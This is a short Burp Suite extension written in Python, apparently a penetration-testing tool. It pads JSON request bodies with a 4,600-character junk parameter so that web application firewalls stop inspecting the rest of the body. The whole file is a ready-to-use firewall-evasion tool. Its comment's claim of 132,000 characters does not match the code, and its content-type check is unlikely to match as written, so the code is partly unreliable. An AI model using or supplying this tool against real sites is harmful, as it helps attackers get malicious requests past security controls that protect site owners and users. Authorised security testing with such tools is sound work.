from burp import IBurpExtender, IHttpListener
import json
from collections import OrderedDict

class BurpExtender(IBurpExtender, IHttpListener):

    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        self._callbacks.setExtensionName("bypass-top-tiers-WAF-with-junk")
        self._callbacks.registerHttpListener(self)

    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        if messageIsRequest:
            request = messageInfo.getRequest()
            analyzedRequest = self._helpers.analyzeRequest(request)

            headers = analyzedRequest.getHeaders()
            body = request[analyzedRequest.getBodyOffset():].tostring()

            if 'application/json' in headers:
                try:
                    body_json = json.loads(body, object_pairs_hook=OrderedDict)

                    # Insert the new key-value pair at the top
                    new_body_json = OrderedDict([('ParameterNameThatDoesNotExist', '0' * 4600)] + body_json.items()) # 132.000 characters

                    # Convert JSON back to a string and update the request
                    new_body = json.dumps(new_body_json)
                    new_request = self._helpers.buildHttpMessage(headers, new_body)
                    messageInfo.setRequest(new_request)

                except Exception as e:
                    # If the body is not valid JSON or another error occurs, skip processing
                    print("Error processing JSON: {}".format(e))
                    return

